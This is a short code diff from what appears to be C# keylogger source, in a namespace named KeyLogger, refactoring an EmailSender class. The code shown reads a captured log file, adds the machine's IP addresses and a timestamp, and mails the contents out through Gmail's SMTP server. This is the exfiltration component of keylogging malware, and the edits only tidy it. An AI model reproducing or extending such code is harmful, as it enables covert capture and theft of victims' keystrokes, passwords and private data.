@@ -7,14 +7,14 @@ namespace KeyLogger
 {
     class EmailSender
     {
-        public void SendMessage(string file)
+        public void SendMessage(string filePath)
         {
             DateTime now = DateTime.Now;
-            string logContent = File.ReadAllText(file);
-
-            string emailBody = string.Empty;
+            string logContent = File.ReadAllText(filePath);
 
             var host = Dns.GetHostEntry(Dns.GetHostName());
+
+            string emailBody = string.Empty;
 
             foreach (var address in host.AddressList)
             {
@@ -26,7 +26,7 @@ namespace KeyLogger
             emailBody += "\ntime: " + now.ToString();
             emailBody += "\n" + logContent;
 
-            using (SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587))
+            using (SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587)) //gmail port
             {
                 smtpClient.EnableSsl = true;
                 smtpClient.UseDefaultCredentials = false;
